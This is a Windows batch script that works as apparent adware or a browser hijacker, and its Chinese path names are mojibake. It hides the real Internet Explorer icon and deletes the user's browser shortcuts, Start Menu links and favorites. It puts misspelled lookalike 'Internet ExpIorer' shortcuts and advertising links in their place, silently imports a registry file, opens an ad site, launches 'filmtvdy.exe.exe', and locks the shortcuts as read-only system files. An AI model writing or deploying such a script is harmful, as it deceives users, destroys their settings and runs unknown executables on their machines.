cls
@echo off
 Reg Add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu" /v "{871C5380-42A0-1069-A2EA-08002B30309D}" /t "REG_DWORD" /d "1" /f
Reg Add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel" /v "{871C5380-42A0-1069-A2EA-08002B30309D}" /t "REG_DWORD" /d "1" /f
Set "TMPINF=C:\TmpInf.inf"
echo [Version] >%TMPINF%
echo Signature="$Windows NT$" >>%TMPINF%
echo [DefaultInstall] >>%TMPINF%
RUNDLL32 SETUPAPI.DLL,InstallHinfSection DefaultInstall 128 %TMPINF%
del %TMPINF%

 
del "%userprofile%\����\IEXPLORE.lnk"
del "%userprofile%\����\IEXPLOREr.lnk"
del "%userprofile%\����\Internet Exporer.lnk"
del "%userprofile%\����\Internet Explorer.lnk"
del "%userprofile%\����\Internet Exp1orer.lnk"
del "%userprofile%\����\Internet Explorer.lnk" 
del "%userprofile%\����\Internet*.lnk"  /f/q/a
del "%userprofile%\����\*Internet*.lnk" /f/q/a

 
del "%userprofile%\����ʼ���˵�\����\Internet*.lnk"  /f/q/a
del "%userprofile%\����ʼ���˵�\����\*Internet*.lnk" /f/q/a


del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.lnk" /f/q/a
del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.url" /f/q/a
del "%userprofile%\����\*.url"     /f/q/a
del   "%userprofile%\����ʼ���˵�\*.url"   /f/q/a
del   "%userprofile%\����ʼ���˵�\*.lnk"  /f/q/a
del  "C:\Documents and Settings\All Users\����ʼ���˵�\*.url" /f/q/a
del  "C:\Documents and Settings\All Users\����ʼ���˵�\*.lnk" /f/q/a



copy "��ѶQQ.lnk" "%userprofile%\����ʼ���˵�\����\����\QQ.lnk" /y
copy "Internet ExpIorer.lnk" "%userprofile%\����\Internet Expleror.lnk" /y
copy "�Ա�����.lnk" "%userprofile%\����\�Ա�����.lnk" /y
copy "yx.lnk" "%userprofile%\����\С��Ϸ.lnk" /y
copy "��ѵ�Ӱ.lnk" "%userprofile%\����\��ѵ�Ӱ.lnk" /y
copy "FilmTVkk.lnk" "%userprofile%\����\�����������.lnk" /y
copy "zq.lnk" "%userprofile%\����\��׬500��Ŀ.lnk" /y
 


copy "Internet ExpIorer.lnk" "%userprofile%\����ʼ���˵�\��ַ֮��.lnk" /y
copy "�Ա�����.lnk" "%userprofile%\����ʼ���˵�\�Ա�����.lnk" /y
copy "��ѵ�Ӱ.lnk" "%userprofile%\����ʼ���˵�\��ѵ�Ӱ.lnk" /y
copy "FilmTVkk.lnk" "%userprofile%\����ʼ���˵�\�����������.lnk" /y
copy "yx.lnk" "%userprofile%\����ʼ���˵�\С��Ϸ.lnk" /y
 

copy "FilmTVkk.lnk" "%userprofile%\����ʼ���˵�\����\�����������.lnk" /y
copy "Internet ExpIorer.lnk" "%userprofile%\����ʼ���˵�\����\Internet ExpIorer.lnk" /y
copy "Internet ExpIorer.lnk" "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\���� Internet Explorrer �����.lnk" /y

 copy "FilmTVkk.lnk" "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\�����������.lnk" /y
 copy "yx.lnk" "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\С��Ϸ.lnk" /y



copy "taobao.lnk" "%userprofile%\Favorites\�Ա�����.lnk" /y
copy "��ѵ�Ӱ.lnk" "%userprofile%\Favorites\��ѵ�Ӱ.lnk" /y
copy "yx.lnk" "%userprofile%\Favorites\С��Ϸ.lnk" /y
copy "Internet ExpIorer.lnk" "%userprofile%\Favorites\��վ��ȫ.lnk" /y 


regedit /s sy.reg
 
 start http://www.7802.com/index1.html
 start filmtvdy.exe.exe
 

 attrib  "%USERPROFILE%\����\*.lnk"  +R +S

 attrib "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.lnk"  +R +S



exit